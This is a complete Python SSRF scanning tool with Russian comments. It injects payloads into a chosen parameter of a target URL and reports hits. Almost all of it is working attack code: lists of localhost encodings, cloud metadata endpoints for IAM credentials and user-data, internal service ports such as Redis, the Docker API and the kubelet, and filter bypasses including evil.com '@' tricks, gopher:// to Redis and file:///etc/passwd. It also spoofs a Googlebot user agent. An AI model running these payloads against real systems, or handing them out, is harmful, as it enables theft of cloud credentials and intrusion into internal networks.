#!/usr/bin/env python3
import requests
import argparse
import socket
import re
from urllib.parse import urlparse
import warnings
warnings.filterwarnings("ignore")
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# ── SSRF Payloads
──────────────────────────────────────────────────────────────
LOCALHOST_PAYLOADS = [
"http://127.0.0.1/",
"http://localhost/",
"http://0.0.0.0/",
"http://[::1]/",
"http://0177.0.0.01/",
 # Octal: 127.0.0.1
"http://0x7f000001/",
 # Hex: 127.0.0.1
"http://2130706433/",
 # Decimal: 127.0.0.1
"http://127.1/",
 # Short form
"http://127.0.1/",
"http://spoofed.burpcollaborator.net/",
]
# Эндпоинты облачных метадата-серверов
CLOUD_METADATA_PAYLOADS = [
# AWS
"http://169.254.169.254/latest/meta-data/",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
"http://169.254.169.254/latest/user-data/",
# GCP
"http://metadata.google.internal/computeMetadata/v1/",
"http://169.254.169.254/computeMetadata/v1/",
# Azure
"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
# DigitalOcean
"http://169.254.169.254/metadata/v1/",
# Alibaba Cloud
"http://100.100.100.200/latest/meta-data/",
]
# Внутренние сервисы
INTERNAL_SERVICE_PAYLOADS = [
"http://192.168.1.1/",
 # Типичный роутер
"http://10.0.0.1/",
 # Внутренняя сеть
"http://172.16.0.1/",
 # Private range
"http://127.0.0.1:8080/", # Alt HTTP
"http://127.0.0.1:8443/", # Alt HTTPS
"http://127.0.0.1:3000/", # Node.js dev
"http://127.0.0.1:5000/", # Flask dev
"http://127.0.0.1:6379/", # Redis
"http://127.0.0.1:27017/", # MongoDB
"http://127.0.0.1:9200/", # Elasticsearch
"http://127.0.0.1:2375/", # Docker API
"http://127.0.0.1:10250/", # Kubernetes kubelet
]
# Bypass техники для обхода фильтров
BYPASS_PAYLOADS = [
"http://127.0.0.1@evil.com/",
 # @ bypass
"http://evil.com@127.0.0.1/",
 # @ bypass v2
"http://127.0.0.1#@evil.com/",
 # # bypass
"http://localhost%2509/",
 # URL double encode
"dict://127.0.0.1:6379/",
 # Dict protocol (Redis)
"gopher://127.0.0.1:6379/_INFO\r\n", # Gopher (Redis)
"file:///etc/passwd",
 # Local file
"file:///etc/hosts",
]
# Признаки успешного SSRF в ответе
SUCCESS_INDICATORS = [
# AWS metadata
"ami-id", "instance-id", "security-credentials", "iam/",
# GCP
"computeMetadata", "google-cloud",
# Common
"root:x:", "root:!", "/bin/bash", "/bin/sh", # /etc/passwd
"127.0.0.1", "localhost",
# Services
"redis_version", "elasticsearch", "mongodb",
"Docker-Distribution", "kubelet",
# Generic internal
"internal", "private", "admin panel",
]
HEADERS = {
"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",
"Accept": "*/*",
}
def check_ssrf(url: str, param: str, payload: str,
method: str, session: requests.Session) -> dict | None:
"""Тестирует один SSRF payload."""
params = {param: payload}
try:
if method == "GET":
resp = session.get(url, params=params, timeout=5,
verify=False, allow_redirects=False)
else:
resp = session.post(url, data=params, timeout=5,
verify=False, allow_redirects=False)
body = resp.text.lower()
# Проверяем индикаторы успеха
for indicator in SUCCESS_INDICATORS:
if indicator.lower() in body:
return {
"payload": payload,
"indicator": indicator,
"status": resp.status_code,
"body_len": len(resp.text),
"preview": resp.text[:200],
}
# Подозрительно: успешный ответ без типичного содержимого
if resp.status_code == 200 and len(resp.text) > 100:
return {
"payload": payload,
"indicator": "HTTP 200 with body",
"status": resp.status_code,
"body_len": len(resp.text),
"preview": resp.text[:200],
}
except requests.Timeout:
# Таймаут на внутренний ресурс может означать успешное подключение
return {
"payload": payload,
"indicator": "TIMEOUT (possible blind SSRF)",
"status": 0,
"body_len": 0,
"preview": "",
}
except Exception:
pass
return None
def main():
parser = argparse.ArgumentParser(description="SSRF Probe")
parser.add_argument("-u", "--url", required=True, help="Целевой URL")
parser.add_argument("-p", "--param", required=True, help="Параметр для
тестирования")
parser.add_argument("-m", "--method", default="GET", choices=["GET",
"POST"])
parser.add_argument("--category", default="all",
choices=["all", "localhost", "cloud", "internal", "bypass"],
help="Категория тестов")
args = parser.parse_args()
session = requests.Session()
session.headers.update(HEADERS)
# Выбираем категорию payloads
category_map = {
"localhost": LOCALHOST_PAYLOADS,
"cloud": CLOUD_METADATA_PAYLOADS,
"internal": INTERNAL_SERVICE_PAYLOADS,
"bypass": BYPASS_PAYLOADS,
"all":
 (LOCALHOST_PAYLOADS + CLOUD_METADATA_PAYLOADS +
INTERNAL_SERVICE_PAYLOADS + BYPASS_PAYLOADS),
}
payloads = category_map[args.category]
print(f"{CYAN}[*] SSRF Probe → {args.url}{RESET}")
print(f"{CYAN}[*] Параметр: {args.param} | Метод: {args.method}{RESET}")
print(f"{CYAN}[*] Payloads: {len(payloads)}{RESET}")
print("-" * 60)
findings = []
for payload in payloads:
print(f" {CYAN}→ {payload[:60]}{RESET}", end=" ")
result = check_ssrf(args.url, args.param, payload,
args.method, session)
if result:
print(f"{GREEN}[HIT] {result['indicator']}{RESET}")
findings.append(result)
else:
print(f"{RED}[-]{RESET}")
print(f"\n{'='*60}")
if findings:
print(f"{GREEN}[✓] Найдено {len(findings)} потенциальных SSRF!{RESET}")
for f in findings:
print(f"\n {GREEN}Payload: {f['payload']}{RESET}")
print(f" Indicator: {f['indicator']}")
if f['preview']:
print(f" Preview: {f['preview'][:100]}")
else:
print(f"{RED}[-] SSRF не обнаружена{RESET}")
if __name__ == "__main__":
main()
